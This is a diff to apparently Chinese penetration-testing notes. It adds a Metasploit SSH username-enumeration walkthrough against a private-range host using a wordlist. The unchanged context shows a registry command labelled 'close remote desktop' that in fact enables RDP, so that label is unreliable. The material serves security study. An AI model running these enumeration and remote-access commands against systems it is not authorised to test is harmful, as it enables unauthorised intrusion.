@@ -154,3 +154,15 @@ RDP - TCP 3389
     關閉遠端桌面
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 <img  alt="image" src="https://github.com/user-attachments/assets/7dc0850f-419a-4d06-bf35-c5ae7f37d432">
+
+SSH
+---
+    msfconsole -q
+    search ssh_enum
+    use 1
+<img width="507" alt="image" src="https://github.com/user-attachments/assets/a8212496-ec9d-49d2-b980-7c914dad5202">
+    set rhost 192.168.0.70
+    set user_file Wordlist/Username.txt
+    set check_false true
+    run
+<img alt="image" src="https://github.com/user-attachments/assets/38fe0043-1516-4839-9ac1-beb849d7eb02">
